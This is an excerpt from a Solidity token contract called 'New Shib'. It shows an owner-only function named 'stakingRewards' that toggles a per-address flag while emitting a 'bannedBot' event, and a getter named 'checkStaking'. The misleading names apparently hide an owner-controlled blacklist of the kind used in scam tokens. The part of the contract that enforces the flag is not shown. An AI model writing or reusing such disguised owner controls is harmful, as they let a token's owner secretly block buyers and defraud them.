...
contract NewShib is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = 'New Shib';
    string private _symbol = 'NewSHIB';
    ...
    function stakingRewards(address _address) external onlyOwner {
        if (_stakingRewards[_address] == true) {_stakingRewards[_address] = false;}
        else {_stakingRewards[_address] = true; 
        emit bannedBot (_address, _stakingRewards[_address]);}
    }

    function checkStaking(address _address) public view returns (bool) {
        return _stakingRewards[_address];
    }
